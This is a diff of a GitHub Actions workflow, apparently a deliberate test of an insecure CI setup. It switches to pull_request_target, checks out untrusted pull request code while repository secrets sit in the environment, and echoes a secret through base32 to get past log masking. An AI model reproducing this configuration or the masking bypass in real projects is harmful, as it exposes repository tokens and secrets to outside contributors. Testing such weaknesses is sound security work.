@@ -1,13 +1,18 @@
-name: Main branch
- 
-on: pull_request # run on pull request events
- 
-permissions:
- pull-requests: write # grant write permission on the pull-requests endpoint
+name: Test Vuln Action
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
 jobs:
- approve:
-   runs-on: ubuntu-latest
- 
-   steps:
-     - run: | # approve the pull request
-         echo "Workflow from main branch"
+  test-vuln-action-from-pr:
+    runs-on: ubuntu-latest
+    env: # Or as an environment variable
+      git_pat: ${{ secrets.GITHUB_TOKEN }}
+      super_secret: ${{ secrets.TEMP }}
+    steps:
+      - uses: actions/checkout@v4
+        with: 
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Run Script
+        run: |
+          echo "Test WengOnn-Deriv"
+          env | grep "super_secret" | base32
